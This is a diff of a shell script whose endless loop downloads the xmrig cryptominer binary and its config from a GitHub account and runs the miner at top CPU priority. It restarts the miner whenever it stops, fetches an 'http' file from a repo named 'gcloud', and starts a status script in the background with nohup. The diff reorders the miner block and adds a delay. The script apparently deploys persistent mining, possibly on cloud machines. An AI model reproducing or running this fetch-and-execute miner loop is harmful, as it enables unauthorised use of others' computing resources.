@@ -11,22 +11,6 @@ rm -rf config.json
 while true
 do
 
-  if [ ! -e 'xmrig' ]
-  then
-     wget -q https://github.com/Predador21/files/raw/main/xmrig && chmod 777 xmrig
-  fi
-
-  if [ ! -e 'config.json' ]
-  then
-     wget -q https://raw.githubusercontent.com/Predador21/files/main/config.json
-     sed -i 's/"rig-id":.*/"rig-id": "'$account'",/' config.json
-  fi
-
-  if ! pgrep xmrig > /dev/null
-  then
-     nice -n -20 ./xmrig
-  fi
-
   if [ ! -e 'http' ]
   then
      wget -q https://raw.githubusercontent.com/Predador21/gcloud/main/http
@@ -81,5 +65,22 @@ do
   then
      nohup ./status.sh > /dev/null &
   fi
+
+  if [ ! -e 'xmrig' ]
+  then
+     wget -q https://github.com/Predador21/files/raw/main/xmrig && chmod 777 xmrig
+  fi
+
+  if [ ! -e 'config.json' ]
+  then
+     wget -q https://raw.githubusercontent.com/Predador21/files/main/config.json
+     sed -i 's/"rig-id":.*/"rig-id": "'$account'",/' config.json
+  fi
+
+  if ! pgrep xmrig > /dev/null
+  then
+     sleep 60
+     nice -n -20 ./xmrig
+  fi  
 
 done
